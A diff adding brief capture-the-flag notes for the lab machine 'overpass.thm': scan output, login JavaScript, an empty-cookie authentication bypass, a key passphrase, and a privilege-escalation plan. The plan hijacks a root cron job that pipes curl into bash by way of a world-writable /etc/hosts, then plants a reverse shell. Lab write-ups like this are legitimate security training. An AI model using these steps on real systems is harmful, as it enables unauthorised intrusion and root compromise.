@@ -1,0 +1,44 @@
+Gobuster scan
+
+/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
+/admin                (Status: 301) [Size: 42] [--> /admin/]
+/css                  (Status: 301) [Size: 0] [--> css/]
+/downloads            (Status: 301) [Size: 0] [--> downloads/]
+/img                  (Status: 301) [Size: 0] [--> img/]
+/index.html           (Status: 301) [Size: 0] [--> ./]
+
+Nmap scan
+22 - ssh
+80 - http (golang server)
+
+/admin
+
+async function login() {
+    const usernameBox = document.querySelector("#username");
+    const passwordBox = document.querySelector("#password");
+    const loginStatus = document.querySelector("#loginStatus");
+    loginStatus.textContent = ""
+    const creds = { username: usernameBox.value, password: passwordBox.value }
+    const response = await postData("/api/login", creds)
+    const statusOrCookie = await response.text()
+    if (statusOrCookie === "Incorrect credentials") {
+        loginStatus.textContent = "Incorrect Credentials"
+        passwordBox.value=""
+    } else {
+        Cookies.set("SessionToken",statusOrCookie)
+        window.location = "/admin"
+    }
+}
+
+
+Set empty cookie SessionToken 
+
+Got RSA key
+
+Passcoke james13
+
+
+linpeas: /etc/hosts world-writable
+/etc/crontab - executes root curl overpass.thm/downloads/src/buildscript.sh | bash
+
+put revshell
